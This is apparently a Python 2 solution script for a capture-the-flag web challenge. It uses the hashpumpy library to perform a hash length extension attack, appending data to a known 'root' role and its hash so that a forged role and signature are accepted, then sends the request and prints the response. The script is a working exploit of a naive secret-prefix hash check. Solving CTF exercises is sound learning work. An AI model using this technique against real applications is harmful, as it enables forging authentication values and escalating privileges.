#python2
import requests
import urllib
import hashpumpy
web_url="http://ctf.whaledu.com:10010/web44/?role={role}&hash={hash}"
hash_raw="a0566a65f9d6bfd9abf2c116ef1ca2af"
orgin_data="root"
add_data = "whaleCTF"
key_len = 6
digest,msg = hashpumpy.hashpump(hash_raw,orgin_data,add_data,key_len)
msg=urllib.quote(msg)
print("digest:%s,msg:%s"%(digest,msg))

url = web_url.format(role=msg,hash=digest)
print(url)
res = requests.get(url)
content = res.content.decode("utf-8")
headers = res.headers
print(headers)
print(content)
